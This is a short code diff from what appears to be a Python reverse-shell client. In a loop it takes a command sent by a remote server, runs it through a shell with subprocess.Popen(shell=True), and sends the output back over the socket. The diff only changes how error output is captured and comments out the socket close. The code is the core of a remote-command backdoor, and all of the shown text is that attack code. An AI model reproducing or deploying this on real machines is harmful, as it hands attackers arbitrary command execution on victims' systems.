@@ -17,12 +17,12 @@ while True:
   serverCommand = serverCommand.decode()
   
   #Open command prompt and insert command given by the server
-  cmdPrompt = subprocess.Popen(serverCommand, shell=True, stdout = subprocess.PIPE, stderr = subprocess.STDOUT)
+  cmdPrompt = subprocess.Popen(serverCommand, shell=True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
   getOutput = cmdPrompt.stdout.read()
   getErrorOut = cmdPrompt.stderr.read()
   
   #Send back the output
   client.send(getOutput)
   
-client.close()
+#client.close()
 print('Connection disconnected.')
